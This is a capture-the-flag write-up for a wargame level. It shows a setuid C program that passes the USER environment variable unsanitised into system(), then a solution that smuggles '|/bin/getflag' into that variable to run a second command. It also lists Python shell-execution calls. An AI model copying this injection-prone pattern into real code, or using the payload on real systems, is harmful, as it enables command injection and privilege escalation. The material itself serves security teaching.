# Level02

#### About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.


#### Sources
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
	char *buffer;

	gid_t gid;
	uid_t uid;

	gid = getegid();
	uid = geteuid();

	setresgid(gid, gid, gid);
	setresuid(uid, uid, uid);

	buffer = NULL;

	asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
	printf("about to call system(\"%s\")\n", buffer);
	
	system(buffer);
}
```

#### Solutions
```
export USER="level02|/bin/getflag"
/home/flag02/flag02
about to call system("/bin/echo level02|/bin/getflag is cool")
You have successfully executed getflag on a target account
```

#### Remommend

Python execute os command
```
os.system(cmd)
subprocess.call(cmd, shell=True)

subprocess.Popen(cmd, shell=True)
subprocess.communicate()
```
